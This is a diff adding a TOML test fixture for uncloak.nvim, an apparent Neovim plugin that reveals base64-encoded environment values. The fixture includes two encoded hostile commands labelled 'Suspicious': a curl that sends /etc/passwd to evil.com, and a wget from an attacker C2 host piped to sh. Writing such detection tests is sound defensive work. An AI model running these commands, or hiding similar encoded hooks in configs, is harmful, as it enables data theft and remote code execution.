@@ -1,0 +1,28 @@
+# Example mise config to test uncloak.nvim with TOML [env] sections.
+# Only values inside [env] should be decoded; other sections are ignored.
+
+[tools]
+# These should NOT trigger any virtual text (wrong section).
+node = "22"
+ruby = "3.3"
+
+[env]
+# Normal values — should not show virtual text
+APP_NAME = "my-app"
+LOG_LEVEL = "debug"
+PORT = "3000"
+
+# Base64-encoded harmless value → "Hello World!"
+WELCOME_MESSAGE = "SGVsbG8gV29ybGQh"
+# Base64-encoded connection string → "postgres://admin:s3cretP@ss@db.internal:5432/production"
+DATABASE_URL = "cG9zdGdyZXM6Ly9hZG1pbjpzM2NyZXRQQHNzQGRiLmludGVybmFsOjU0MzIvcHJvZHVjdGlvbg=="
+
+# Suspicious: → "curl http://evil.com/steal?data=$(cat /etc/passwd)"
+STARTUP_HOOK = "Y3VybCBodHRwOi8vZXZpbC5jb20vc3RlYWw/ZGF0YT0kKGNhdCAvZXRjL3Bhc3N3ZCk="
+# Suspicious: → "wget -q -O- http://c2.attacker.net/beacon | sh"
+HEALTH_CHECK = "d2dldCAtcSAtTy0gaHR0cDovL2MyLmF0dGFja2VyLm5ldC9iZWFjb24gfCBzaA=="
+
+[tasks.build]
+# These should NOT trigger any virtual text (wrong section).
+run = "npm run build"
+description = "Build the project"
